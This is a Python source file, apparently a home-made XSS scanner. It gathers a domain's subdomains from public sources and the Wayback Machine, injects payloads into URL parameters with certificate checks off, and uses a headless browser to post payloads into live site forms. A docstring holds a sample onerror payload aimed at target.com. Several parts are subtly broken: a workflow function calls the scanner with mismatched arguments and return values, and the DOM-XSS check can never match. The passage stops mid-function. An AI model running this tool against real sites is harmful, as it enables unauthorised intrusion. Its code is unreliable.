import requests
import threading
from colorama import Fore, Style
import sys
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
import os
import signal
import json
import html
import re
import itertools
import argparse
import logging
from datetime import datetime
import urllib3
import warnings

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

ERROR_LOG_FILE = 'scan_errors.log'

def log_error(context, exc):
    with open(ERROR_LOG_FILE, 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] {context}\n{repr(exc)}\n\n")

# Banner
print(
    Fore.CYAN + Style.BRIGHT +
    r"""
 _   _         _           ___    _                             _    _  ___    ___   
( ) ( )       (_ )        (  _`\ (_ )                          ( )  ( )(  _`\ (  _`\ 
| | | | _   _  | |   ___  | (_) ) | |    _      _     ___ ___  `\`\/'/'| (_(_)| (_(_)
| | | |( ) ( ) | | /' _ `\|  _ <' | |  /'_`\  /'_`\ /' _ ` _ `\  >  <  `\__ \ `\__ \ 
| \_/ || (_) | | | | ( ) || (_) ) | | ( (_) )( (_) )| ( ) ( ) | /'/\`\ ( )_) |( )_) |
`\___/'`\___/'(___)(_) (_)(____/'(___)`\___/'`\___/'(_) (_) (_)(_)  (_)`\____)`\____)
                                                                                     
                                                                                     
 _                ___                                                                
( )              (  _`\                                                              
| |_    _   _    | (_(_)_ _    __   _   _   ___                                      
| '_`\ ( ) ( )   |  _)/'_` ) /'_ `\( ) ( )/' _ `\                                    
| |_) )| (_) |   | | ( (_| |( (_) || (_) || ( ) |                                    
(_,__/'`\__, |   (_) `\__,_)`\__  |`\___/'(_) (_)                                    
       ( )_| |              ( )_) |                                                  
       `\___/'               \___/'                                                  
"""
    + Style.RESET_ALL
)
time.sleep(0.5)
print("\n")

# --- Playwright for DOM-based XSS ---
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False
    print(Fore.YELLOW + '[!] Playwright not installed. DOM-based XSS detection will be skipped.' + Fore.RESET)

import uuid

# --- Playwright login/session support ---
def login_playwright(login_url, username, password, username_selector, password_selector, submit_selector, timeout=5000):
    """
    Logs in to a site using Playwright and returns an authenticated browser context.
    """
    if not PLAYWRIGHT_AVAILABLE:
        return None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            context = browser.new_context()
            page = context.new_page()
            page.goto(login_url, wait_until="load", timeout=timeout)
            page.fill(username_selector, username)
            page.fill(password_selector, password)
            page.click(submit_selector)
            page.wait_for_timeout(2000)
            # Optionally, check for login success (customize as needed)
            # e.g., check for a logout button, user profile, etc.
            return context
    except Exception as e:
        print(Fore.RED + f"[!] Playwright login error: {e}" + Fore.RESET)
        return None

def dom_xss_scan(url, payload, timeout=5000, context=None):
    """
    Ultra-strict DOM-based XSS detection - only reports 100% confirmed XSS.
    """
    if not PLAYWRIGHT_AVAILABLE:
        return False, None
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True) if context is None else None
            page = (browser.new_page() if context is None else context.new_page())
            
            # Enhanced JavaScript monitoring for 100% confirmation
            page.add_init_script("""
                window.__xss_alert = false;
                window.__xss_fetch = false;
                window.__xss_eval = false;
                window.__xss_setTimeout = false;
                window.__xss_setInterval = false;
                window.__xss_execution_count = 0;
                
                // Monitor alert calls with payload verification
                window.alert = function(msg) { 
                    if (msg && msg.includes('""" + payload.replace("'", "\\'") + """')) {
                        window.__xss_alert = true; 
                        window.__xss_execution_count++;
                        console.log('CONFIRMED XSS Alert triggered:', msg);
                    }
                };
                
                // Monitor fetch calls with payload verification
                const origFetch = window.fetch;
                window.fetch = function() { 
                    const url = arguments[0];
                    if (url && url.includes('""" + payload.replace("'", "\\'") + """')) {
                        window.__xss_fetch = true; 
                        window.__xss_execution_count++;
                        console.log('CONFIRMED XSS Fetch triggered:', url);
                    }
                    return origFetch.apply(this, arguments); 
                };
                
                // Monitor eval calls with payload verification
                const origEval = window.eval;
                window.eval = function() { 
                    const code = arguments[0];
                    if (code && code.includes('""" + payload.replace("'", "\\'") + """')) {
                        window.__xss_eval = true; 
                        window.__xss_execution_count++;
                        console.log('CONFIRMED XSS Eval triggered:', code);
                    }
                    return origEval.apply(this, arguments); 
                };
                
                // Monitor setTimeout with payload verification
                const origSetTimeout = window.setTimeout;
                window.setTimeout = function() { 
                    const code = arguments[0];
                    if (typeof code === 'string' && code.includes('""" + payload.replace("'", "\\'") + """')) {
                        window.__xss_setTimeout = true; 
                        window.__xss_execution_count++;
                        console.log('CONFIRMED XSS setTimeout triggered:', code);
                    }
                    return origSetTimeout.apply(this, arguments); 
                };
                
                // Monitor setInterval with payload verification
                const origSetInterval = window.setInterval;
                window.setInterval = function() { 
                    const code = arguments[0];
                    if (typeof code === 'string' && code.includes('""" + payload.replace("'", "\\'") + """')) {
                        window.__xss_setInterval = true; 
                        window.__xss_execution_count++;
                        console.log('CONFIRMED XSS setInterval triggered:', code);
                    }
                    return origSetInterval.apply(this, arguments); 
                };
            """)
            
            network_hits = []
            def on_request(request):
                if payload in request.url:
                    network_hits.append(request.url)
            
            page.on('request', on_request)
            
            # Navigate to the page
            page.goto(url, wait_until="load", timeout=timeout)
            page.wait_for_timeout(3000)  # Increased wait time for better detection
            
            # Check for confirmed JavaScript execution
            alert_triggered = page.evaluate('window.__xss_alert')
            fetch_triggered = page.evaluate('window.__xss_fetch')
            eval_triggered = page.evaluate('window.__xss_eval')
            setTimeout_triggered = page.evaluate('window.__xss_setTimeout')
            setInterval_triggered = page.evaluate('window.__xss_setInterval')
            execution_count = page.evaluate('window.__xss_execution_count')
            
            # Only report if we have confirmed execution
            if alert_triggered:
                if browser: browser.close()
                return True, 'CONFIRMED: alert() executed with payload (DOM XSS)'
            if fetch_triggered:
                if browser: browser.close()
                return True, 'CONFIRMED: fetch() executed with payload (DOM XSS)'
            if eval_triggered:
                if browser: browser.close()
                return True, 'CONFIRMED: eval() executed with payload (DOM XSS)'
            if setTimeout_triggered:
                if browser: browser.close()
                return True, 'CONFIRMED: setTimeout() executed with payload (DOM XSS)'
            if setInterval_triggered:
                if browser: browser.close()
                return True, 'CONFIRMED: setInterval() executed with payload (DOM XSS)'
            
            # Check for network requests with payload (blind XSS)
            if network_hits:
                if browser: browser.close()
                return True, f'CONFIRMED: Network request with payload (Blind XSS): {network_hits}'
            
            # Check if payload is in DOM but only if it's in executable context
            content = page.content()
            if payload in content:
                # Verify it's in an executable context
                dom_context = page.evaluate(f"""
                    (() => {{
                        const payload = '{payload.replace("'", "\\'")}';
                        const elements = document.querySelectorAll('*');
                        for (let el of elements) {{
                            if (el.innerHTML && el.innerHTML.includes(payload)) {{
                                // Only confirm if it's in a script tag
                                if (el.tagName === 'SCRIPT') return 'CONFIRMED: Inside <script> tag (DOM XSS)';
                                // Only confirm if it's in an event handler
                                if (el.hasAttribute('onload') || el.hasAttribute('onerror') || 
                                    el.hasAttribute('onclick') || el.hasAttribute('onmouseover')) {{
                                    return 'CONFIRMED: Inside event handler (DOM XSS)';
                                }}
                                // Only confirm if it's in a dangerous tag with executable attribute
                                if (['IMG', 'SVG', 'IFRAME', 'OBJECT', 'EMBED'].includes(el.tagName)) {{
                                    if (el.hasAttribute('onload') || el.hasAttribute('onerror') || 
                                        el.hasAttribute('onclick') || el.hasAttribute('src') || el.hasAttribute('href')) {{
                                        return 'CONFIRMED: Inside dangerous tag with executable attribute (DOM XSS)';
                                    }}
                                }}
                            }}
                        }}
                        return null; // Not in executable context
                    }})()
                """)
                if dom_context:
                    if browser: browser.close()
                    return True, dom_context
            
            if browser: browser.close()
            return False, None
    except Exception as e:
        return False, f'Playwright error: {e}'

# --- Placeholder for Stored XSS Detection ---
def stored_xss_scan(submit_url, render_url, payload, timeout=5000, context=None):
    """
    Ultra-strict stored XSS detection - only reports 100% confirmed stored XSS.
    """
    if not PLAYWRIGHT_AVAILABLE:
        return False, None, ''
    try:
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True) if context is None else None
            page = (browser.new_page() if context is None else context.new_page())
            page.goto(submit_url, wait_until="load", timeout=timeout)
            page.wait_for_timeout(1000)
            
            forms = page.query_selector_all('form')
            found_any = False
            finding_context = None
            
            for form in forms:
                text_inputs = form.query_selector_all('input[type="text"], textarea')
                for inp in text_inputs:
                    inp.fill(payload)
                
                submit_btn = form.query_selector('button[type="submit"], input[type="submit"]')
                if submit_btn:
                    submit_btn.click()
                else:
                    form.evaluate('form => form.submit()', form)
                
                page.wait_for_timeout(2000)  # Increased wait time
                page.goto(render_url, wait_until="load", timeout=timeout)
                page.wait_for_timeout(3000)  # Increased wait time
                
                content = page.content()
                if payload in content:
                    # Ultra-strict validation: Check if payload is in executable context
                    dom_context = page.evaluate(f"""
                        (() => {{
                            const payload = '{payload.replace("'", "\\'")}';
                            const elements = document.querySelectorAll('*');
                            for (let el of elements) {{
                                if (el.innerHTML && el.innerHTML.includes(payload)) {{
                                    // Only confirm if it's in a script tag
                                    if (el.tagName === 'SCRIPT') return 'CONFIRMED: Inside <script> tag (stored XSS)';
                                    // Only confirm if it's in an event handler
                                    if (el.hasAttribute('onload') || el.hasAttribute('onerror') || 
                                        el.hasAttribute('onclick') || el.hasAttribute('onmouseover')) {{
                                        return 'CONFIRMED: Inside event handler (stored XSS)';
                                    }}
                                    // Only confirm if it's in a dangerous tag with executable attribute
                                    if (['IMG', 'SVG', 'IFRAME', 'OBJECT', 'EMBED'].includes(el.tagName)) {{
                                        if (el.hasAttribute('onload') || el.hasAttribute('onerror') || 
                                            el.hasAttribute('onclick') || el.hasAttribute('src') || el.hasAttribute('href')) {{
                                            return 'CONFIRMED: Inside dangerous tag with executable attribute (stored XSS)';
                                        }}
                                    }}
                                    // Only confirm if it's javascript: protocol in href/src
                                    if (el.hasAttribute('href') && el.href.includes('javascript:')) {{
                                        return 'CONFIRMED: javascript: protocol in href (stored XSS)';
                                    }}
                                    if (el.hasAttribute('src') && el.src.includes('javascript:')) {{
                                        return 'CONFIRMED: javascript: protocol in src (stored XSS)';
                                    }}
                                }}
                            }}
                            return null; // Not in executable context
                        }})()
                    """)
                    
                    if dom_context:
                        found_any = True
                        finding_context = dom_context
                        break
                
                # Enhanced JavaScript execution monitoring for 100% confirmation
                page.add_init_script("""
                    window.__xss_alert = false;
                    window.__xss_fetch = false;
                    window.__xss_eval = false;
                    window.__xss_execution_count = 0;
                    
                    // Monitor alert calls with payload verification
                    window.alert = function(msg) { 
                        if (msg && msg.includes('""" + payload.replace("'", "\\'") + """')) {
                            window.__xss_alert = true; 
                            window.__xss_execution_count++;
                            console.log('CONFIRMED Stored XSS Alert triggered:', msg);
                        }
                    };
                    
                    // Monitor fetch calls with payload verification
                    const origFetch = window.fetch;
                    window.fetch = function() { 
                        const url = arguments[0];
                        if (url && url.includes('""" + payload.replace("'", "\\'") + """')) {
                            window.__xss_fetch = true; 
                            window.__xss_execution_count++;
                            console.log('CONFIRMED Stored XSS Fetch triggered:', url);
                        }
                        return origFetch.apply(this, arguments); 
                    };
                    
                    // Monitor eval calls with payload verification
                    const origEval = window.eval;
                    window.eval = function() { 
                        const code = arguments[0];
                        if (code && code.includes('""" + payload.replace("'", "\\'") + """')) {
                            window.__xss_eval = true; 
                            window.__xss_execution_count++;
                            console.log('CONFIRMED Stored XSS Eval triggered:', code);
                        }
                        return origEval.apply(this, arguments); 
                    };
                """)
                
                network_hits = []
                def on_request(request):
                    if payload in request.url:
                        network_hits.append(request.url)
                
                page.on('request', on_request)
                
                alert_triggered = page.evaluate('window.__xss_alert')
                fetch_triggered = page.evaluate('window.__xss_fetch')
                eval_triggered = page.evaluate('window.__xss_eval')
                
                if alert_triggered:
                    found_any = True
                    finding_context = 'CONFIRMED: alert() executed with stored payload'
                    break
                if fetch_triggered:
                    found_any = True
                    finding_context = 'CONFIRMED: fetch() executed with stored payload'
                    break
                if eval_triggered:
                    found_any = True
                    finding_context = 'CONFIRMED: eval() executed with stored payload'
                    break
                if network_hits:
                    found_any = True
                    finding_context = f'CONFIRMED: Network request with stored payload (Blind XSS): {network_hits}'
                    break
            
            if browser: browser.close()
            if found_any:
                return True, finding_context, 'Stored XSS (Confirmed)' if 'blind' not in (finding_context or '').lower() else 'Blind XSS (Confirmed)'
            return False, None, ''
    except Exception as e:
        return False, f'Playwright error (stored XSS): {e}', ''

# --- Example workflow for stored XSS scanning ---
def scan_stored_xss_workflow(stored_tests):
    """
    stored_tests: list of dicts with keys: submit_url, render_url, payload, (optional) form_selector, input_name
    Example:
    stored_tests = [
        {
            'submit_url': 'http://target.com/comment/submit',
            'render_url': 'http://target.com/comments',
            'payload': '<img src=x onerror=alert(1)>'
        },
        ...
    ]
    """
    for test in stored_tests:
        print(Fore.CYAN + f"[Stored XSS] Submitting to {test['submit_url']} and revisiting {test['render_url']}..." + Fore.RESET)
        found, context = stored_xss_scan(
            test['submit_url'],
            test['render_url'],
            test['payload'],
            test.get('form_selector'),
            test.get('input_name')
        )
        if found:
            print(Fore.GREEN + f"[STORED XSS FOUND] {test['render_url']} | Payload: {test['payload']} | {context}" + Fore.RESET)
        else:
            print(Fore.RED + f"[NOT VULN] {test['render_url']} | Payload: {test['payload']}" + Fore.RESET)

def enumerate_subdomains_crtsh(domain, retries=2):
    url = f'https://crt.sh/?q=%25.{domain}&output=json'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] crt.sh error: {res.status_code}" + Fore.RESET)
                return set()
            entries = json.loads(res.text)
            subdomains = set()
            for entry in entries:
                name = entry.get('name_value')
                if name:
                    for sub in name.split('\n'):
                        if sub.endswith(domain):
                            subdomains.add(sub.strip())
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] crt.sh timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] crt.sh connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error enumerating subdomains from crt.sh: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from crt.sh after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_hackertarget(domain, retries=2):
    url = f'https://api.hackertarget.com/hostsearch/?q={domain}'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200 or 'error' in res.text.lower():
                print(Fore.RED + f"[!] hackertarget error: {res.status_code}" + Fore.RESET)
                return set()
            subdomains = set()
            for line in res.text.splitlines():
                parts = line.split(',')
                if parts and parts[0].endswith(domain):
                    subdomains.add(parts[0].strip())
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] hackertarget timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] hackertarget connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error enumerating subdomains from hackertarget: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from hackertarget after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_alienvault(domain, retries=2):
    url = f'https://otx.alienvault.com/api/v1/indicators/domain/{domain}/passive_dns'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] AlienVault OTX error: {res.status_code}" + Fore.RESET)
                return set()
            data = res.json()
            subdomains = set()
            for entry in data.get('passive_dns', []):
                hostname = entry.get('hostname')
                if hostname and hostname.endswith(domain):
                    subdomains.add(hostname.strip())
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] AlienVault OTX timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] AlienVault OTX connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error from AlienVault OTX: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from AlienVault OTX after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_rapiddns(domain, retries=2):
    url = f'https://rapiddns.io/subdomain/{domain}?full=1'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] RapidDNS error: {res.status_code}" + Fore.RESET)
                return set()
            # Parse subdomains from HTML table
            subdomains = set()
            for line in res.text.splitlines():
                if line.startswith('<td>') and domain in line:
                    sub = line.split('>')[1].split('<')[0].strip()
                    if sub.endswith(domain):
                        subdomains.add(sub)
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] RapidDNS timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] RapidDNS connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error from RapidDNS: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from RapidDNS after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_threatcrowd(domain, retries=2):
    url = f'https://www.threatcrowd.org/searchApi/v2/domain/report/?domain={domain}'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] ThreatCrowd error: {res.status_code}" + Fore.RESET)
                return set()
            data = res.json()
            subdomains = set()
            for sub in data.get('subdomains', []):
                if sub.endswith(domain):
                    subdomains.add(sub.strip())
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] ThreatCrowd timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] ThreatCrowd connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error from ThreatCrowd: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from ThreatCrowd after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_certspotter(domain, retries=2):
    url = f'https://api.certspotter.com/v1/issuances?domain={domain}&include_subdomains=true&expand=dns_names'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] CertSpotter error: {res.status_code}" + Fore.RESET)
                return set()
            data = res.json()
            subdomains = set()
            for entry in data:
                for name in entry.get('dns_names', []):
                    if name.endswith(domain):
                        subdomains.add(name.strip())
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] CertSpotter timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] CertSpotter connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error from CertSpotter: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from CertSpotter after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_bufferover(domain, retries=2):
    url = f'https://dns.bufferover.run/dns?q=.{domain}'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] BufferOver error: {res.status_code}" + Fore.RESET)
                return set()
            data = res.json()
            subdomains = set()
            for entry in data.get('FDNS_A', []) + data.get('RDNS', []):
                parts = entry.split(',')
                sub = parts[-1].strip()
                if sub.endswith(domain):
                    subdomains.add(sub)
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] BufferOver timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] BufferOver connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error from BufferOver: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from BufferOver after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_anubisdb(domain, retries=2):
    url = f'https://jldc.me/anubis/subdomains/{domain}'
    for attempt in range(1, retries+1):
        try:
            res = requests.get(url, timeout=20)
            if res.status_code != 200:
                print(Fore.RED + f"[!] AnubisDB error: {res.status_code}" + Fore.RESET)
                return set()
            data = res.json()
            subdomains = set()
            for sub in data:
                if sub.endswith(domain):
                    subdomains.add(sub.strip())
            return subdomains
        except requests.exceptions.Timeout:
            print(Fore.YELLOW + f"[!] AnubisDB timed out (attempt {attempt}/{retries})..." + Fore.RESET)
        except requests.exceptions.ConnectionError:
            print(Fore.YELLOW + f"[!] AnubisDB connection error (attempt {attempt}/{retries})..." + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"[!] Error from AnubisDB: {e}" + Fore.RESET)
            return set()
    print(Fore.RED + f"[!] Failed to fetch from AnubisDB after {retries} attempts." + Fore.RESET)
    return set()

def enumerate_subdomains_dns(domain):
    # Small built-in wordlist for demonstration
    wordlist = [
        'www', 'mail', 'ftp', 'test', 'dev', 'admin', 'portal', 'webmail', 'ns1', 'ns2', 'blog', 'staging', 'api', 'm', 'shop', 'static', 'cdn', 'img', 'beta', 'demo', 'vpn', 'cpanel', 'secure', 'server', 'db', 'app', 'forum', 'news', 'support', 'mobile', 'old', 'new', 'auth', 'login', 'files', 'download', 'upload', 'docs', 'wiki', 'dashboard', 'monitor', 'status', 'gateway', 'proxy', 'smtp', 'pop', 'imap', 'test1', 'test2', 'test3', 'dev1', 'dev2', 'dev3'
    ]
    import socket
    subdomains = set()
    for prefix in wordlist:
        sub = f"{prefix}.{domain}"
        try:
            socket.gethostbyname(sub)
            subdomains.add(sub)
        except Exception:
            continue
    return subdomains

def is_valid_subdomain(sub, domain=None):
    # Basic check: no @, no spaces, only valid domain chars
    if '@' in sub or ' ' in sub:
        return False
    # Must have at least one dot and not start/end with dot
    if sub.startswith('.') or sub.endswith('.') or '.' not in sub:
        return False
    # Only allow valid domain characters
    if not re.match(r'^[a-zA-Z0-9.-]+$', sub):
        return False
    # Must end with the target domain
    if domain and not sub.endswith('.' + domain) and sub != domain:
        return False
    return True

def enumerate_subdomains(domain):
    """
    Enumerate subdomains using multiple sources.
    """
    print(Fore.CYAN + f"[+] Collecting subdomains from multiple sources..." + Fore.RESET)
    all_subdomains = set()
    
    # Add the main domain
    all_subdomains.add(domain)
    
    # Try each source with better error handling
    sources = [
        ("crt.sh", lambda: enumerate_subdomains_crtsh(domain)),
        ("hackertarget", lambda: enumerate_subdomains_hackertarget(domain)),
        ("AlienVault OTX", lambda: enumerate_subdomains_alienvault(domain)),
        ("RapidDNS", lambda: enumerate_subdomains_rapiddns(domain)),
        ("ThreatCrowd", lambda: enumerate_subdomains_threatcrowd(domain)),
        ("CertSpotter", lambda: enumerate_subdomains_certspotter(domain)),
        ("BufferOver", lambda: enumerate_subdomains_bufferover(domain)),
        ("AnubisDB", lambda: enumerate_subdomains_anubisdb(domain)),
        ("DNS brute-force", lambda: enumerate_subdomains_dns(domain))
    ]
    
    for source_name, source_func in sources:
        try:
            subdomains = source_func()
            if subdomains:
                all_subdomains.update(subdomains)
                print(Fore.GREEN + f"  ✓ {len(subdomains)} from {source_name}" + Fore.RESET)
            else:
                print(Fore.YELLOW + f"  - 0 from {source_name}" + Fore.RESET)
        except Exception as e:
            print(Fore.RED + f"  ✗ Error from {source_name}: {str(e)}" + Fore.RESET)
            log_error(f"Subdomain enumeration {source_name}", e)
    
    # Filter and validate subdomains
    valid_subdomains = []
    for sub in all_subdomains:
        if is_valid_subdomain(sub, domain):
            valid_subdomains.append(sub)
    
    return sorted(set(valid_subdomains))

def fetch_wayback_urls(domain):
    """
    Fetch historical URLs from Wayback Machine with improved error handling.
    """
    try:
        url = f'http://web.archive.org/cdx/search/cdx?url=*.{domain}/*&output=json&fl=original&collapse=urlkey'
        response = requests.get(url, timeout=20, verify=False)
        if response.status_code == 200:
            data = response.json()
            if len(data) > 1:  # Skip header row
                urls = [row[0] for row in data[1:]]  # Skip header
                return list(set(urls))  # Remove duplicates
        return []
    except requests.exceptions.Timeout:
        print(Fore.YELLOW + f"[!] Wayback Machine timeout for {domain}" + Fore.RESET)
        return []
    except requests.exceptions.ConnectionError:
        print(Fore.YELLOW + f"[!] Wayback Machine connection error for {domain}" + Fore.RESET)
        return []
    except Exception as e:
        print(Fore.RED + f"[!] Error fetching URLs from Wayback Machine: {e}" + Fore.RESET)
        log_error(f"Wayback URLs for {domain}", e)
        return []

def load_payloads(filename):
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip() and not line.startswith('#')]

def inject_payloads(url, payload):
    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    if not query:
        return [url + ("&" if "?" in url else "?") + f"xss={urllib.parse.quote(payload)}"]
    mutated_urls = []
    for param in query:
        mutated = query.copy()
        mutated[param] = [payload]
        new_query = urllib.parse.urlencode(mutated, doseq=True)
        new_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        mutated_urls.append(new_url)
    return mutated_urls

def scan_url(url, payload, timeout=10):
    try:
        res = requests.get(url, timeout=timeout, verify=False, allow_redirects=True)
        reflected = payload in res.text
        context = ''
        is_xss = False
        vuln_type = None
        
        if reflected:
            idx = res.text.find(payload)
            snippet = res.text[max(0, idx-150):idx+len(payload)+150]
            
            # ULTRA-STRICT XSS validation - only report 100% confirmed XSS
            payload_lower = payload.lower()
            snippet_lower = snippet.lower()
            
            # 1. CONFIRMED: Payload inside <script> tags (100% XSS)
            if '<script' in snippet_lower:
                script_start = snippet_lower.find('<script')
                script_end = snippet_lower.find('</script>', script_start)
                if script_start < idx < script_end:
                    # Additional verification: Check if it's actually executable JavaScript
                    script_content = snippet[script_start:script_end]
                    if any(js_func in script_content.lower() for js_func in ['alert(', 'confirm(', 'prompt(', 'eval(', 'document.', 'window.']):
                        context = 'Confirmed: Inside <script> tag with executable JavaScript'
                        is_xss = True
                        vuln_type = 'Reflected XSS (Confirmed)'
            
            # 2. CONFIRMED: Event handlers with payload (100% XSS)
            elif any(handler in snippet_lower for handler in ['onload=', 'onerror=', 'onclick=', 'onmouseover=', 'onfocus=']):
                for handler in ['onload=', 'onerror=', 'onclick=', 'onmouseover=', 'onfocus=']:
                    if handler in snippet_lower:
                        handler_pos = snippet_lower.find(handler)
                        # Verify payload is actually in the event handler value
                        if abs(handler_pos - idx) < 30:
                            # Check if payload is in quotes after the handler
                            after_handler = snippet[handler_pos:handler_pos+50]
                            if payload in after_handler and ('"' in after_handler or "'" in after_handler):
                                context = f'Confirmed: Inside {handler} event handler'
                                is_xss = True
                                vuln_type = 'Reflected XSS (Confirmed)'
                                break
            
            # 3. CONFIRMED: javascript: protocol in href/src (100% XSS)
            elif 'javascript:' in payload_lower and ('href=' in snippet_lower or 'src=' in snippet_lower):
                # Verify it's actually in an href or src attribute
                for attr in ['href=', 'src=']:
                    if attr in snippet_lower:
                        attr_pos = snippet_lower.find(attr)
                        if abs(attr_pos - idx) < 50:
                            context = f'Confirmed: javascript: protocol in {attr}'
                            is_xss = True
                            vuln_type = 'Reflected XSS (Confirmed)'
                            break
            
            # 4. CONFIRMED: data: protocol with HTML/JavaScript (100% XSS)
            elif 'data:text/html' in payload_lower and ('src=' in snippet_lower or 'href=' in snippet_lower):
                for attr in ['src=', 'href=']:
                    if attr in snippet_lower:
                        attr_pos = snippet_lower.find(attr)
                        if abs(attr_pos - idx) < 50:
                            context = f'Confirmed: data: protocol in {attr}'
                            is_xss = True
                            vuln_type = 'Reflected XSS (Confirmed)'
                            break
            
            # 5. CONFIRMED: Dangerous tags with executable attributes (100% XSS)
            elif any(tag in snippet_lower for tag in ['<img', '<svg', '<iframe', '<object', '<embed']):
                for tag in ['<img', '<svg', '<iframe', '<object', '<embed']:
                    if tag in snippet_lower:
                        tag_pos = snippet_lower.find(tag)
                        if abs(tag_pos - idx) < 50:
                            # Check if payload is in an executable attribute
                            tag_snippet = snippet[tag_pos:tag_pos+100]
                            if any(attr in tag_snippet.lower() for attr in ['onload=', 'onerror=', 'onclick=', 'src=', 'href=']):
                                context = f'Confirmed: Inside {tag} with executable attribute'
                                is_xss = True
                                vuln_type = 'Reflected XSS (Confirmed)'
                                break
            
            # 6. CONFIRMED: CSS expression() or url() with JavaScript (100% XSS)
            elif 'expression(' in payload_lower and 'style=' in snippet_lower:
                style_pos = snippet_lower.find('style=')
                if abs(style_pos - idx) < 50:
                    context = 'Confirmed: CSS expression() in style attribute'
                    is_xss = True
                    vuln_type = 'Reflected XSS (Confirmed)'
            
            # 7. CONFIRMED: Base64 encoded JavaScript in data: URL (100% XSS)
            elif 'data:text/html;base64' in payload_lower and ('src=' in snippet_lower or 'href=' in snippet_lower):
                for attr in ['src=', 'href=']:
                    if attr in snippet_lower:
                        attr_pos = snippet_lower.find(attr)
                        if abs(attr_pos - idx) < 50:
                            context = 'Confirmed: Base64 encoded HTML in data: URL'
                            is_xss = True
                            vuln_type = 'Reflected XSS (Confirmed)'
                            break
        
        # DOM-based XSS check (only if not already found)
        if not is_xss:
            dom_xss, dom_context = dom_xss_scan(url, payload)
            if dom_xss:
                # Only accept DOM XSS if it's confirmed execution
                if any(confirm in dom_context.lower() for confirm in ['alert() triggered', 'eval() triggered', 'fetch() triggered', 'setTimeout() triggered']):
                    is_xss = True
                    context = dom_context
                    vuln_type = 'DOM-based XSS (Confirmed)'
        
        return {
            'url': url,
            'payload': payload,
            'reflected': is_xss,
            'context': context,
            'type': vuln_type or '',
